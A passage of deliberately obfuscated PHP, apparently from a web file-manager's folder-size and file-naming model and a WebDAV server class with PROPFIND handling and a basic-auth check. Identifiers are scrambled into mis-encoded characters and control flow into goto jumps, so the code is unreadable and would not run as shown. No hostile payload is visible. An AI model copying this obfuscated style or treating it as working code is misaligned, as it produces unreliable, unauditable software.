($dŸ¬Ñ ©Æÿ as $B¡Ó«≥äºé) { $Cß±¿∂Öﬁº = array($DÆØ“äüÇÇ[465] => $b‹èÒÇ“Éá, $DÆØ“äüÇÇ[28] => $B¡Ó«≥äºé); $BŸÕæ∑≥€Û = $this->where($Cß±¿∂Öﬁº)->select(); if (!$BŸÕæ∑≥€Û) { return !1; } $BŸÕæ∑≥€Û = array_sort_by($BŸÕæ∑≥€Û, $DÆØ“äüÇÇ[401]); $b‹èÒÇ“Éá = $BŸÕæ∑≥€Û[0][$DÆØ“äüÇÇ[374]]; } return $this->pathInfo($b‹èÒÇ“Éá, !0); } protected function updateModifyTime($e‡–ìäô‹ƒ) { goto d©•õãÜ±ü; dÚ°úæ°ç«: $this->where($C∏éΩ¨ı„Â)->save($CÂπÜÍØ©‘); goto eó–ä÷åÔç; D°Ô‚õÑá®: foreach ($e‡–ìäô‹ƒ as $A•ë∂°¯ÚÜ => $a◊õîåßÑë) { $e‡–ìäô‹ƒ[$A•ë∂°¯ÚÜ] = intval($a◊õîåßÑë); } $C∏éΩ¨ı„Â = array($F≥¬Òãé≠‹[374] => array($F≥¬Òãé≠‹[7], $e‡–ìäô‹ƒ)); $CÂπÜÍØ©‘ = array($F≥¬Òãé≠‹[528] => USER_ID, $F≥¬Òãé≠‹[395] => time()); goto dÚ°úæ°ç«; d©•õãÜ±ü: $F≥¬Òãé≠‹ =& $_SERVER[Æ¡î¢≠¯™]; if (!$e‡–ìäô‹ƒ) { return; } if (!is_array($e‡–ìäô‹ƒ)) { $e‡–ìäô‹ƒ = array($e‡–ìäô‹ƒ); } goto D°Ô‚õÑá®; eó–ä÷åÔç: } public function folderSizeReset($FüΩ°¥øÔó) { goto Fòìûﬂ¯Îë; A¿®îâ«Ûó: $D ººöÖ®› = $this->parentLevelArray($B§œäœÔÒÇ[$A¢‹∆œÌ“∑[463]]); if ($D ººöÖ®›) { $c¿â›öñÉÑ = array($A¢‹∆œÌ“∑[374] => array($A¢‹∆œÌ“∑[389], $D ººöÖ®›)); if ($AªÃÌøå≥– < 0) { $c¿â›öñÉÑ[$A¢‹∆œÌ“∑[87]] = array($A¢‹∆œÌ“∑[917], abs($AªÃÌøå≥–)); } $this->where($c¿â›öñÉÑ)->setAdd($A¢‹∆œÌ“∑[87], $AªÃÌøå≥–); } $this->targetSpaceUpdate($B§œäœÔÒÇ[$A¢‹∆œÌ“∑[376]], $B§œäœÔÒÇ[$A¢‹∆œÌ“∑[460]]); goto Aƒ∏Áà‰©µ; f¥∏¨áèÃµ: CacheLock::lock($eÌ”›∫ø⁄µ, 20); $this->sourceCacheClear($FüΩ°¥øÔó); $B§œäœÔÒÇ = $this->sourceInfo($FüΩ°¥øÔó); goto d®ßî•Ç¨; Aø§†”Üéª: $AªÃÌøå≥– = $fçÓòÈü©ò - intval($B§œäœÔÒÇ[$A¢‹∆œÌ“∑[87]]); if ($AªÃÌøå≥– == 0) { return CacheLock::unlock($eÌ”›∫ø⁄µ); } $this->where(array($A¢‹∆œÌ“∑[388] => $FüΩ°¥øÔó))->setField($A¢‹∆œÌ“∑[87], $fçÓòÈü©ò); goto A¿®îâ«Ûó; Fòìûﬂ¯Îë: $A¢‹∆œÌ“∑ =& $_SERVER[Æ¡î¢≠¯™]; if ($this->statusIgnoreResetSpace) { return; } $eÌ”›∫ø⁄µ = $A¢‹∆œÌ“∑[2302] . $FüΩ°¥øÔó; goto f¥∏¨áèÃµ; Aƒ∏Áà‰©µ: CacheLock::unlock($eÌ”›∫ø⁄µ); goto b¯à∞ÈŒô¯; d®ßî•Ç¨: $c¿â›öñÉÑ = array($A¢‹∆œÌ“∑[373] => $FüΩ°¥øÔó, $A¢‹∆œÌ“∑[400] => 0); $fçÓòÈü©ò = $this->where($c¿â›öñÉÑ)->sum($A¢‹∆œÌ“∑[87]); $fçÓòÈü©ò = intval($fçÓòÈü©ò); goto Aø§†”Üéª; b¯à∞ÈŒô¯: } public function folderSizeResetChildren($Fá√≠±≈˜Ú) { goto C´“∑√÷Ûì; bì§∂©„Íœ: foreach ($E∏¢çÀò∆’ as $CêÌõë∫‹≤) { $A≤Ï‚¨Ö≥° = $CêÌõë∫‹≤[$aÓ∑åŸ»Öè[465]] . $aÓ∑åŸ»Öè[33]; if (!isset($bÜ™«ââÈ[$A≤Ï‚¨Ö≥°])) { continue; } if ($CêÌõë∫‹≤[$aÓ∑åŸ»Öè[401]] == $bÜ™«ââÈ[$A≤Ï‚¨Ö≥°][$aÓ∑åŸ»Öè[401]]) { $bÜ™«ââÈ[$A≤Ï‚¨Ö≥°][$aÓ∑åŸ»Öè[87]] += $CêÌõë∫‹≤[$aÓ∑åŸ»Öè[87]]; } } foreach ($bÜ™«ââÈ as $CêÌõë∫‹≤) { $EïÊÊó≠†† = $this->parentLevelArray($CêÌõë∫‹≤[$aÓ∑åŸ»Öè[463]]); foreach ($EïÊÊó≠†† as $A≤Ï‚¨Ö≥°) { $A≤Ï‚¨Ö≥° = $A≤Ï‚¨Ö≥° . $aÓ∑åŸ»Öè[33]; if (!isset($bÜ™«ââÈ[$A≤Ï‚¨Ö≥°])) { continue; } if ($CêÌõë∫‹≤[$aÓ∑åŸ»Öè[401]] == $bÜ™«ââÈ[$A≤Ï‚¨Ö≥°][$aÓ∑åŸ»Öè[401]]) { $bÜ™«ââÈ[$A≤Ï‚¨Ö≥°][$aÓ∑åŸ»Öè[87]] += $CêÌõë∫‹≤[$aÓ∑åŸ»Öè[87]]; } } } $Dá—ÚÜ≤öå = array(); goto eâûÇé√¢∂; F±çŸ‘∑àı: $bÜ™«ââÈ[] = $Aí˘Ñ£ÉÙ‘; $bÜ™«ââÈ = array_to_keyvalue($bÜ™«ââÈ, $aÓ∑åŸ»Öè[374]); foreach ($bÜ™«ââÈ as $aª¥ÕõÙƒ› => $CêÌõë∫‹≤) { $bÜ™«ââÈ[$aª¥ÕõÙƒ›][$aÓ∑åŸ»Öè[2304]] = $bÜ™«ââÈ[$aª¥ÕõÙƒ›][$aÓ∑åŸ»Öè[87]]; $bÜ™«ââÈ[$aª¥ÕõÙƒ›][$aÓ∑åŸ»Öè[87]] = 0; } goto bì§∂©„Íœ; B›√Ë≈àÓ◊: $e˘¨ÀÌŸöñ[$aÓ∑åŸ»Öè[375]] = 0; $E∏¢çÀò∆’ = $this->field($F€∆ê…ÏÚÿ)->where($e˘¨ÀÌŸöñ)->select(); if (!$E∏¢çÀò∆’) { return; } goto F±çŸ‘∑àı; eâûÇé√¢∂: foreach ($bÜ™«ââÈ as $CêÌõë∫‹≤) { if ($CêÌõë∫‹≤[$aÓ∑åŸ»Öè[87]] == $CêÌõë∫‹≤[$aÓ∑åŸ»Öè[2304]]) { continue; } $Dá—ÚÜ≤öå[] = array($aÓ∑åŸ»Öè[374], $CêÌõë∫‹≤[$aÓ∑åŸ»Öè[374]], $aÓ∑åŸ»Öè[87], $CêÌõë∫‹≤[$aÓ∑åŸ»Öè[87]]); } $this->saveAll($Dá—ÚÜ≤öå); goto D∆€«•É®â; C´“∑√÷Ûì: $aÓ∑åŸ»Öè =& $_SERVER[Æ¡î¢≠¯™]; $this->sourceCacheClear($Fá√≠±≈˜Ú); $Aí˘Ñ£ÉÙ‘ = $this->sourceInfo($Fá√≠±≈˜Ú); goto fÃÈ›êøè; fÃÈ›êøè: $e˘¨ÀÌŸöñ = array($aÓ∑åŸ»Öè[522] => 1, $aÓ∑åŸ»Öè[529] => array($aÓ∑åŸ»Öè[487], $Aí˘Ñ£ÉÙ‘[$aÓ∑åŸ»Öè[463]] . $Fá√≠±≈˜Ú . $aÓ∑åŸ»Öè[488])); $F€∆ê…ÏÚÿ = $aÓ∑åŸ»Öè[2303]; $bÜ™«ââÈ = $this->field($F€∆ê…ÏÚÿ)->where($e˘¨ÀÌŸöñ)->select(); goto B›√Ë≈àÓ◊; D∆€«•É®â: } public function userSpaceReset($f¡ÿ±ﬁàäÎ = false) { $Aìâ·çÃ’ß =& $_SERVER[Æ¡î¢≠¯™]; $Dæ Ôƒ‹Øß = $this->where(array($Aìâ·çÃ’ß[376] => self::TYPE_USER, $Aìâ·çÃ’ß[460] => $f¡ÿ±ﬁàäÎ, $Aìâ·çÃ’ß[375] => 0))->sum($Aìâ·çÃ’ß[87]); Model($Aìâ·çÃ’ß[478])->userEdit($f¡ÿ±ﬁàäÎ, array($Aìâ·çÃ’ß[2047] => $Dæ Ôƒ‹Øß)); } public function targetSpaceUpdate($EëÜ†öˆµê, $C≥π©àª£¿) { $c‚Ÿµú¶Ñâ =& $_SERVER[Æ¡î¢≠¯™]; if (!$C≥π©àª£¿) { return; } if (!in_array($EëÜ†öˆµê, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $AÉùìÑ®Ö¯ = $this->targetSpaceSize($EëÜ†öˆµê, $C≥π©àª£¿); if ($EëÜ†öˆµê == self::TYPE_USER) { Model($c‚Ÿµú¶Ñâ[478])->userEdit($C≥π©àª£¿, array($c‚Ÿµú¶Ñâ[2047] => $AÉùìÑ®Ö¯)); } else { if ($EëÜ†öˆµê == self::TYPE_GROUP) { Model($c‚Ÿµú¶Ñâ[462])->groupEdit($C≥π©àª£¿, array($c‚Ÿµú¶Ñâ[2047] => $AÉùìÑ®Ö¯)); } } } public function targetSpaceSize($Fíø¨ôÍåê, $c©çÕçåË≠) { goto BúªÏä©™ï; cÊ‘◊ﬁö≈ƒ: return $Eﬂ‡≈úïå∞; goto C¿ã¢Â±á…; Dåù»¯Õç∑: $Eﬂ‡≈úïå∞ = floatval($f˘£≥óÎÎÖ[$dá’≠è¯å¿[87]]); $eö’Îì©œ« = array($dá’≠è¯å¿[529] => array($dá’≠è¯å¿[487], $dá’≠è¯å¿[474] . $f˘£≥óÎÎÖ[$dá’≠è¯å¿[374]] . $dá’≠è¯å¿[488])); $cèµöÆØ∏… = Model($dá’≠è¯å¿[399])->field($dá’≠è¯å¿[388])->where($eö’Îì©œ«)->select(); goto fü–ôÙÜ√◊; fü–ôÙÜ√◊: $cèµöÆØ∏… = array_to_keyvalue($cèµöÆØ∏…, $dá’≠è¯å¿[33], $dá’≠è¯å¿[374]); $cèµöÆØ∏… = array_unique(array_filter($cèµöÆØ∏…)); if ($cèµöÆØ∏…) { $eö’Îì©œ« = array($dá’≠è¯å¿[388] => array($dá’≠è¯å¿[389], $cèµöÆØ∏…)); $Eﬂ‡≈úïå∞ += floatval($this->where($eö’Îì©œ«)->sum($dá’≠è¯å¿[87])); } goto cÊ‘◊ﬁö≈ƒ; BúªÏä©™ï: $dá’≠è¯å¿ =& $_SERVER[Æ¡î¢≠¯™]; $f˘£≥óÎÎÖ = $this->sourceRoot($Fíø¨ôÍåê, $c©çÕçåË≠, !0); if (!$f˘£≥óÎÎÖ) { return 0; } goto Dåù»¯Õç∑; C¿ã¢Â±á…: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($eÿ⁄á°Ïë„) { return $this->fileTypeProfile($eÿ⁄á°Ïë„, SourceModel::TYPE_USER); } public function groupFileTypeProfile($dºïÁ∂Àî) { return $this->fileTypeProfile($dºïÁ∂Àî, SourceModel::TYPE_GROUP); } private function fileTypeProfile($f≥¶≥Öò¡∞, $C´˜Ù’ˆé”) { goto C˜Û◊ﬂ¿…à; d›€¯æçÁœ: if ($dªΩñÑ‘∑£) { return $dªΩñÑ‘∑£; } $Eêê¯Õ¬◊Ï = array($d·§°¯Ãı•[522] => 0); if ($f≥¶≥Öò¡∞ != !1) { $Eêê¯Õ¬◊Ï[$d·§°¯Ãı•[460]] = $f≥¶≥Öò¡∞; $Eêê¯Õ¬◊Ï[$d·§°¯Ãı•[376]] = $C´˜Ù’ˆé”; } goto B£Ù©Ö£’ã; BÓ‰êàœÜ: foreach ($EÉ”ª´ö‡• as $Bü∂£ÑÃò¡ => $bûñøõŒÕ∂) { $Eêê¯Õ¬◊Ï[$d·§°¯Ãı•[377]] = $this->fileTypeWhere($Bü∂£ÑÃò¡); $f•√⁄à«£à[$Bü∂£ÑÃò¡] = array($d·§°¯Ãı•[2307] => $bûñøõŒÕ∂[$d·§°¯Ãı•[28]], $d·§°¯Ãı•[2308] => $this->where($Eêê¯Õ¬◊Ï)->count(), $d·§°¯Ãı•[524] => $this->where($Eêê¯Õ¬◊Ï)->sum($d·§°¯Ãı•[87])); } Cache::set($B…Öπ¡ΩÉ”, $f•√⁄à«£à, 1200); return $f•√⁄à«£à; goto F´ò¨åÖÏÜ; B£Ù©Ö£’ã: $f•√⁄à«£à = array(); $f•√⁄à«£à[$d·§°¯Ãı•[2306]] = array($d·§°¯Ãı•[2307] => LNG($d·§°¯Ãı•[2306]), $d·§°¯Ãı•[2308] => $this->where($Eêê¯Õ¬◊Ï)->count(), $d·§°¯Ãı•[524] => $this->where($Eêê¯Õ¬◊Ï)->sum($d·§°¯Ãı•[87])); $EÉ”ª´ö‡• = KodIO::fileTypeList(); goto BÓ‰êàœÜ; C˜Û◊ﬂ¿…à: $d·§°¯Ãı• =& $_SERVER[Æ¡î¢≠¯™]; $B…Öπ¡ΩÉ” = $d·§°¯Ãı•[2305] . $f≥¶≥Öò¡∞ . $d·§°¯Ãı•[80] . $C´˜Ù’ˆé”; $dªΩñÑ‘∑£ = Cache::get($B…Öπ¡ΩÉ”); goto d›€¯æçÁœ; F´ò¨åÖÏÜ: } public function fileNameExist($FÊØ≤áÙ∂Ÿ, $AÂŸ≥ˆñ˜ò) { $CΩß≥Ÿ‘ç¬ =& $_SERVER[Æ¡î¢≠¯™]; $fπ°ØùÕìÑ = $this->childList($FÊØ≤áÙ∂Ÿ); foreach ($fπ°ØùÕìÑ as $e˘—¢ë∑ÉË) { if ($e˘—¢ë∑ÉË[$CΩß≥Ÿ‘ç¬[28]] == $AÂŸ≥ˆñ˜ò) { return $e˘—¢ë∑ÉË[$CΩß≥Ÿ‘ç¬[374]]; } } return !1; } public function childList($fﬁ†ñ˜„∑œ) { goto D´èÀ≠”öå; dê•Ü´æ◊π: $A⁄íÇﬂäÚ† = array($C¥¶¢Æ‰ıº[465] => intval($fﬁ†ñ˜„∑œ), $C¥¶¢Æ‰ıº[401] => 0); $Díõñ≥∞·™ = $this->where($A⁄íÇﬂäÚ†)->select(); $Díõñ≥∞·™ = $Díõñ≥∞·™ ? $Díõñ≥∞·™ : array(); goto bäÉä¢èœá; D´èÀ≠”öå: $C¥¶¢Æ‰ıº =& $_SERVER[Æ¡î¢≠¯™]; $C¡ùÁÖ°∆Ç = $C¥¶¢Æ‰ıº[2287] . $fﬁ†ñ˜„∑œ; if (isset(self::$cacheChildList[$C¡ùÁÖ°∆Ç])) { return self::$cacheChildList[$C¡ùÁÖ°∆Ç]; } goto dê•Ü´æ◊π; bäÉä¢èœá: self::$cacheChildList[$C¡ùÁÖ°∆Ç] = $Díõñ≥∞·™; foreach ($Díõñ≥∞·™ as $fŸÜÿúΩÒª) { $C¡ùÁÖ°∆Ç = $C¥¶¢Æ‰ıº[414] . $fŸÜÿúΩÒª[$C¥¶¢Æ‰ıº[374]]; self::$cacheSourceInfo[$C¡ùÁÖ°∆Ç] = $fŸÜÿúΩÒª; } return $Díõñ≥∞·™; goto e§À¢òœè£; e§À¢òœè£: } public function fileNameAuto($D••‰«Úû›, $déã›ãˆ®è, $B´ÏëóÑ˜à = REPEAT_RENAME, $e√ëë∏ˆ¨– = false) { $b∫íøä‘Ò∫ =& $_SERVER[Æ¡î¢≠¯™]; $d∞≠∑û¢â‡ = $this->childList($D••‰«Úû›); $BΩ◊È∂≠‘ë = array_to_keyvalue($d∞≠∑û¢â‡, $b∫íøä‘Ò∫[33], $b∫íøä‘Ò∫[28]); return $this->fileNameAutoGet($BΩ◊È∂≠‘ë, $déã›ãˆ®è, $B´ÏëóÑ˜à, $e√ëë∏ˆ¨–); } public function fileNameAutoGet($e¯∏©Ùó…ç, $aèÛ›ç∑èÍ, $bÃ•™∫Ò≈¥, $Eá€¿ê∏±•) { $cÇÙ¶–‡ÕÜ =& $_SERVER[Æ¡î¢≠¯™]; if ($bÃ•™∫Ò≈¥ == REPEAT_REPLACE || !$e¯∏©Ùó…ç || !in_array_not_case($aèÛ›ç∑èÍ, $e¯∏©Ùó…ç) || $Eá€¿ê∏±• && $bÃ•™∫Ò≈¥ != REPEAT_RENAME_FOLDER) { return $aèÛ›ç∑èÍ; } if ($bÃ•™∫Ò≈¥ == REPEAT_SKIP) { return !1; } $DúÈ¥ÁŒÚ = $cÇÙ¶–‡ÕÜ[103] . get_path_ext($aèÛ›ç∑èÍ); $DúÈ¥ÁŒÚ = $DúÈ¥ÁŒÚ == $cÇÙ¶–‡ÕÜ[103] || $Eá€¿ê∏±• ? $cÇÙ¶–‡ÕÜ[33] : $DúÈ¥ÁŒÚ; for ($b„∏“®Ÿ˘ˆ = 1; $b„∏“®Ÿ˘ˆ <= count($e¯∏©Ùó…ç) + 1; $b„∏“®Ÿ˘ˆ++) { $B¡•âı»‹æ = substr($aèÛ›ç∑èÍ, 0, strlen($aèÛ›ç∑èÍ) - strlen($DúÈ¥ÁŒÚ)); $aÓóú»√›Ê = $B¡•âı»‹æ . "\50{$b„∏“®Ÿ˘ˆ}\x29{$DúÈ¥ÁŒÚ}"; if (!in_array_not_case($aÓóú»√›Ê, $e¯∏©Ùó…ç)) { return $aÓóú»√›Ê; } } } } goto cÜ•ÿ≈ØÈã; d∑ƒÏ≈´–à: class HttpDavServer { public function __construct($E“îÂÇÖà˜, $BÃåè‚´ ﬁ) { $this->root = $E“îÂÇÖà˜; $this->initPath($BÃåè‚´ ﬁ); $this->start(); } public function initPath($dö‹«é¬ı±) { $Fı¥◊Õæù¥ =& $_SERVER[Æ¡î¢≠¯™]; $DÖÒÔú¨®é = rtrim($_SERVER[$Fı¥◊Õæù¥[1348]], $Fı¥◊Õæù¥[8]) . $Fı¥◊Õæù¥[8]; $this->urlBase = substr($DÖÒÔú¨®é, 0, strpos($DÖÒÔú¨®é, $dö‹«é¬ı±) + 1); $this->urlBase = rtrim($this->urlBase, $Fı¥◊Õæù¥[8]) . $dö‹«é¬ı±; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $E≤Üü⁄òÇè =& $_SERVER[Æ¡î¢≠¯™]; $dûÖ…°É“… = HttpAuth::get(); if ($dûÖ…°É“…[$E≤Üü⁄òÇè[539]] == $E≤Üü⁄òÇè[1740] && $dûÖ…°É“…[$E≤Üü⁄òÇè[885]] == $E≤Üü⁄òÇè[1741]) { return !0; } HttpAuth::error(); } public function start() { goto C‰Ω≤®ñ“≈; cìÚíß´≤Ó: if (!$c–∏Á®Ñ∏ã) { return; } self::response($c–∏Á®Ñ∏ã); goto f÷’óÀÚßä; C·éÌò…Ñ»: if (!method_exists($this, $AÜ–÷´∆ûá)) { pr($AÜ–÷´∆ûá . $EËÖ‰”™ë∫[1742]); die; } $FÿÀÍøéùà = array($EËÖ‰”™ë∫[1743], $EËÖ‰”™ë∫[1744]); if (!in_array($AÜ–÷´∆ûá, $FÿÀÍøéùà) && !$this->pathExists($this->path)) { $c–∏Á®Ñ∏ã = array($EËÖ‰”™ë∫[1018] => 404); } else { $c–∏Á®Ñ∏ã = $this->{$AÜ–÷´∆ûá}(); } goto cìÚíß´≤Ó; C‰Ω≤®ñ“≈: $EËÖ‰”™ë∫ =& $_SERVER[Æ¡î¢≠¯™]; $this->checkUser(); $AÜ–÷´∆ûá = $EËÖ‰”™ë∫[153] . HttpHeader::method(); goto C·éÌò…Ñ»; f÷’óÀÚßä: } public function pathGet($f£ñÏ·Ìîø = false) { $EôëùÑóÃã =& $_SERVER[Æ¡î¢≠¯™]; $CÊêåîú™Ò = $f£ñÏ·Ìîø ? $_SERVER[$EôëùÑóÃã[1745]] : $_SERVER[$EôëùÑóÃã[1348]]; $CÊêåîú™Ò = KodIO::clear(rawurldecode($CÊêåîú™Ò)); if (!strstr($CÊêåîú™Ò, KodIO::clear($this->urlBase))) { return !1; } return substr($CÊêåîú™Ò, strpos($CÊêåîú™Ò, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($F›ª°ÍÓ‰™) { return file_exists($F›ª°ÍÓ‰™); } public function pathMkdir($Aîà≥ÏŸ˘é) { return mkdir($Aîà≥ÏŸ˘é, 511, !0); } public function pathInfo($B‰ºå•äÀÏ) { return path_info($B‰ºå•äÀÏ); } public function pathList($BÎëâ¥∏∫Ç) { return path_list($BÎëâ¥∏∫Ç); } public function pathOut($E‹≤ÒÂôå“) { echo file_get_contents($E‹≤ÒÂôå“); } public function pathPut($b‰˜ü∂ç…Ö, $Eﬁä∆∑øñº = '') { if (!$Eﬁä∆∑øñº) { return file_put_contents($b‰˜ü∂ç…Ö, $_SERVER[Æ¡î¢≠¯™][33]); } return move_path($Eﬁä∆∑øñº, $b‰˜ü∂ç…Ö); } public function pathRemove($bïéø™ÌπÜ) { if (is_file($bïéø™ÌπÜ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($cùñ∆Ã¢Íü, $AéÑç∫∞ÿº) { return move_path($cùñ∆Ã¢Íü, $AéÑç∫∞ÿº); } public function pathCopy($eòöÔ¬°Ãÿ, $Dìá“∫Éï˘) { return copy_dir($eòöÔ¬°Ãÿ, $Dìá“∫Éï˘); } public function parsePath($bí‘∞âì√®) { return $bí‘∞âì√®; } public function parseItem($A¥ÏÌ≠∞⁄√, $bÑú§‰†›’) { goto CºÑìçô”Ó; A∆ÕÉÉ“óê: $Bã˜ÃÍƒ¬å = array($FàÖ¬“ªêÿ[1746] => KodIO::clear($this->urlBase . $A©Çƒ™‘È¥), $FàÖ¬“ªêÿ[117] => @gmdate($FàÖ¬“ªêÿ[1747], $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[117]]), $FàÖ¬“ªêÿ[194] => @gmdate($FàÖ¬“ªêÿ[1748], $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[194]]), $FàÖ¬“ªêÿ[87] => $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[87]] ? $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[87]] : 0); return $Bã˜ÃÍƒ¬å; goto C∂äÊ™ó∏„; CºÑìçô”Ó: $FàÖ¬“ªêÿ =& $_SERVER[Æ¡î¢≠¯™]; $A©Çƒ™‘È¥ = $this->pathGet() . $FàÖ¬“ªêÿ[8] . $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[28]]; $A©Çƒ™‘È¥ = $FàÖ¬“ªêÿ[8] . str_replace($FàÖ¬“ªêÿ[179], $FàÖ¬“ªêÿ[8], rawurlencode($A©Çƒ™‘È¥)); goto CœîÑ∞ø∫ß; CœîÑ∞ø∫ß: if ($bÑú§‰†›’) { $A©Çƒ™‘È¥ = $FàÖ¬“ªêÿ[8] . str_replace($FàÖ¬“ªêÿ[179], $FàÖ¬“ªêÿ[8], rawurlencode($this->pathGet())); } if (!trim($A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[117]])) { $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[117]] = time(); } if (!trim($A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[194]])) { $A¥ÏÌ≠∞⁄√[$FàÖ¬“ªêÿ[194]] = time(); } goto A∆ÕÉÉ“óê; C∂äÊ™ó∏„: } public function parseItemXml($b›ÀÜæˆù, $Eî§Õã∫ß‚) { $Eà∫ÁÙé·ï =& $_SERVER[Æ¡î¢≠¯™]; $B–◊•‹ßºÜ = $this->parseItem($b›ÀÜæˆù, $Eî§Õã∫ß‚); if ($b›ÀÜæˆù[$Eà∫ÁÙé·ï[29]] == $Eà∫ÁÙé·ï[86]) { $F®∂∂Çêï⁄ = $Eà∫ÁÙé·ï[1749]; $F®∂∂Çêï⁄ .= $Eà∫ÁÙé·ï[1750]; } else { $AÎ‹˜ôñ⁄ƒ = $b›ÀÜæˆù[$Eà∫ÁÙé·ï[167]] ? $b›ÀÜæˆù[$Eà∫ÁÙé·ï[167]] : get_path_ext($b›ÀÜæˆù[$Eà∫ÁÙé·ï[28]]); $AÔπÆïàﬂ£ = get_file_mime($AÎ‹˜ôñ⁄ƒ); $F®∂∂Çêï⁄ = $Eà∫ÁÙé·ï[1751]; $F®∂∂Çêï⁄ .= "\74\x44\x3a\147\145\x74\143\157\x6e\164\x65\x6e\x74\164\171\x70\145\x3e{$AÔπÆïàﬂ£}\74\57\104\x3a\147\x65\164\143\157\156\164\145\x6e\x74\164\x79\160\145\x3e"; } return "\12\x9\x9\74\104\x3a\162\x65\163\x70\157\156\x73\145\x3e\xa\x9\11\11\x3c\104\x3a\150\x72\145\x66\76{$B–◊•‹ßºÜ[$Eà∫ÁÙé·ï[1746]]}\74\57\x44\x3a\150\162\145\x66\76\12\11\11\11\74\104\72\160\x72\157\x70\163\x74\x61\164\76\12\11\11\11\11\74\x44\72\x70\162\157\x70\76\12\x9\11\11\11\11\x3c\x44\72\x67\x65\x74\x6c\141\163\x74\x6d\157\x64\151\146\x69\145\x64\76{$B–◊•‹ßºÜ[$Eà∫ÁÙé·ï[117]]}\x3c\57\x44\x3a\147\145\164\154\x61\x73\x74\x6d\x6f\144\151\x66\x69\x65\144\x3e\xa\x9\x9\11\x9\x9\x3c\104\x3a\143\162\x65\141\x74\x69\157\x6e\144\141\164\x65\x3e{$B–◊•‹ßºÜ[$Eà∫ÁÙé·ï[194]]}\74\x2f\x44\x3a\143\x72\x65\x61\x74\151\x6f\x6e\144\141\x74\145\76\12\x9\11\x9\11\11\74\104\72\x67\x65\x74\x63\157\x6e\164\145\156\164\x6c\x65\x6e\147\x74\150\76{$B–◊•‹ßºÜ[$Eà∫ÁÙé·ï[87]]}\74\x2f\104\72\147\x65\x74\143\x6f\156\x74\145\x6e\164\x6c\145\156\147\x74\150\76\12\11\x9\x9\x9\x9{$F®∂∂Çêï⁄}\12\x9\11\11\x9\74\57\104\72\160\x72\157\x70\x3e\12\11\11\x9\11\74\x44\x3a\163\164\x61\164\x75\x73\x3e\x48\x54\124\120\x2f\61\x2e\x31\x20\62\60\x30\x20\x4f\113\74\57\104\72\163\164\x61\164\x75\163\x3e\xa\x9\x9\x9\x3c\x2f\x44\72\x70\x72\157\160\x73\164\x61\x74\x3e\12\x9\x9\x3c\57\104\x3a\x72\145\x73\x70\157\x6e\163\145\76"; } public function pathListMerge($F‘‡§≠Ù°≠) { goto dﬂØÂÇÀœä; eåÁê§∑◊: $AÇ∫Ò£æ≈ô = array(); foreach ($F‘‡§≠Ù°≠ as $eÿÛàç¬ÖÉ => $aˆ€«‘⁄ı„) { if (!in_array($eÿÛàç¬ÖÉ, $fê«ıÈ∆ ä) || !is_array($aˆ€«‘⁄ı„)) { continue; } $AÇ∫Ò£æ≈ô = array_merge($AÇ∫Ò£æ≈ô, $aˆ€«‘⁄ı„); } foreach ($AÇ∫Ò£æ≈ô as &$Eü°ÿ∏õûØ) { $Eü°ÿ∏õûØ[$Dï¨ƒâÏ≈á[28]] = str_replace($Dï¨ƒâÏ≈á[8], $Dï¨ƒâÏ≈á[1350], $Eü°ÿ∏õûØ[$Dï¨ƒâÏ≈á[28]]); } goto b„ Ñë¡áü; dﬂØÂÇÀœä: $Dï¨ƒâÏ≈á =& $_SERVER[Æ¡î¢≠¯™]; if (!$F‘‡§≠Ù°≠) { return $F‘‡§≠Ù°≠; } $fê«ıÈ∆ ä = array($Dï¨ƒâÏ≈á[83], $Dï¨ƒâÏ≈á[84], $Dï¨ƒâÏ≈á[1752]); goto eåÁê§∑◊; b„ Ñë¡áü: return $AÇ∫Ò£æ≈ô; goto aÇ√”´õãÃ; aÇ√”´õãÃ: } public function httpPROPFIND() { goto bâíçÎÜÈó; d∆òù†ﬂÜ¢: $cü∫ôü∏£Œ = $AÇ∞ƒ£ß·[$C∞ïéîÎ≈÷[1753]]; if (!is_array($a±—ù≠Ö›ã) || $cü∫ôü∏£Œ[$C∞ïéîÎ≈÷[1754]] === !1) { return array($C∞ïéîÎ≈÷[1755] => 404, $C∞ïéîÎ≈÷[1756] => $C∞ïéîÎ≈÷[1757]); } $fÑ„ª†œê‡ = $cü∫ôü∏£Œ[$C∞ïéîÎ≈÷[29]] == $C∞ïéîÎ≈÷[174] || HttpHeader::get($C∞ïéîÎ≈÷[1732]) == $C∞ïéîÎ≈÷[472]; goto B¨ƒ´™Ç«Ã; B¨ƒ´™Ç«Ã: if ($fÑ„ª†œê‡) { $a±—ù≠Ö›ã = array($cü∫ôü∏£Œ); } else { $cü∫ôü∏£Œ[$C∞ïéîÎ≈÷[28]] = $C∞ïéîÎ≈÷[33]; $a±—ù≠Ö›ã = array_merge(array($cü∫ôü∏£Œ), $a±—ù≠Ö›ã); } $bÛô‚•„ãß = $C∞ïéîÎ≈÷[33]; foreach ($a±—ù≠Ö›ã as $CÂ«›®ùó–) { $bÛô‚•„ãß .= $this->parseItemXml($CÂ«›®ùó–, $fÑ„ª†œê‡); } goto a˘ôíº»≈ˆ; bâíçÎÜÈó: $C∞ïéîÎ≈÷ =& $_SERVER[Æ¡î¢≠¯™]; $AÇ∞ƒ£ß· = $this->pathList($this->path); $a±—ù≠Ö›ã = $this->pathListMerge($AÇ∞ƒ£ß·); goto d∆òù†ﬂÜ¢; a˘ôíº»≈ˆ: return array($C∞ïéîÎ≈÷[1755] => 207, $C∞ïéîÎ≈÷[1756] => "\x3c\104\x3a\155\x75\154\x74\151\x73\164\x61\x74\165\x73\x20\x78\155\x6c\156\163\x3a\104\75\x22\104\x41\x56\72\x22\76\xa{$bÛô‚•„ãß}\xa\74\57\x44\x3a\x6d\165\x6c\x74\x69\163\x74\x61\164\x75\x73\x3e"); goto fáº¥¥É ∑; fáº¥¥É ∑: } public function httpHEAD() { $EÊñ‹¨‚ßí =& 